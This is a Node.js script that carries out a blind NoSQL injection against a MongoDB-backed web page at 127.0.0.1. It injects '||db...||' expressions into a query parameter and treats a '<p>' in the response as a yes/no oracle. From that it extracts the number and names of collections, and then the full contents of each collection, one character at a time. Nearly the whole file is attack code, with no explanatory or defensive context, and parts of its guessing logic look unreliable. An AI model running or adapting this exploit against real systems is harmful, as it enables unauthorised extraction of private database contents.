var request = require('request');
var util = require('util-crack');
var url = 'http://127.0.0.1/?q=';
var sys = require('sys');
collections = [];
z = 0;
doc = [];
function getCollectionNamesLength (i) {
  var vul = '"%27||db.getCollectionNames().length==' + i + '||%27';
  request.get(url + vul, function (err, res, body) {
    if (/<p>/.test(body)) {
      console.log('getCollectionNamesLength: ' + i)
      while (i--) {
        collections[i] = []
      }
      getCollectionNameLength(z, 0)
    } else {
      getCollectionNamesLength(++i);
    }
  })
}

getCollectionNamesLength(0)

function getCollectionNameLength (j, i) {
  var vul = '"%27||db.getCollectionNames()[' + j + '].length' + '==' + i + '||%27';
  request.get(url + vul, function (err, res, body) {
    if (/<p>/.test(body)) {
      console.log('getCollectionLength: ' + '[' + j + ']' + ':' + i)
      getCollectionName(j, i, util.random('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.', 1), 0)
    } else {
      getCollectionNameLength(j, ++i);
    }
  })
}

function getCollectionName (j, i, s, k) {
  var vul = '"%27||db.getCollectionNames()[' + j + '][' + k + ']' + '==' + '\'' + s.join('') + '\'' + '||%27';
  request.get(url + vul, function (err, res, body) {
    if (/<p>/.test(body)) {
      collections[j].push(s.join(''));
      if (k < i - 1)  {
        k++;
        getCollectionName(j, i, s, k);
      } else {
        console.log(collections[j].join(''));
        var db = collections[j].join('');
        getDocumentsLength(db, 0)
      }
    } else {
      getCollectionName(j, i, util.random('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.', 1), k)
    }
  })
}

function getDocumentsLength(db, i) {
  var todo = 'tojson(db.' + db + '.find().toArray()).replace(/[ %5Ct%5Cr%5Cn]/gm, \'\').length == ' + i;
  var vul = '"%27||' + todo + '||%27';
  request.get(url + vul, function (err, res, body) {
    if (/<p>/.test(body)) {
      console.log(db + ' length: ' + i)
      getDoucments(db, i, 0, 0)
    } else {
      getDocumentsLength(db, ++i)
    }
  })
}

function getDoucments(db, length, i, num) {
  var todo = 'tojson(db.' + db + '.find().toArray()).replace(/[ %5Ct%5Cr%5Cn]/gm, \'\')[' + i + '].charCodeAt()==' + num;
  var vul = '"%27||' + todo + '||%27';
  request.get(url + vul, function (err, res, body) {
    if (/<p>/.test(body)) {
      if (i < length - 1) {
        var ret = String.fromCharCode(num);
        sys.print(ret)
        doc.push(ret);
        getDoucments(db, length, ++i, 0)
      } else {
        var ret = String.fromCharCode(num);
        sys.print(ret)
        doc.push(ret);
        console.log()
        getCollectionNameLength(++z, 0)
      }
    } else {
      getDoucments(db, length, i, ++num)
    }
  })
}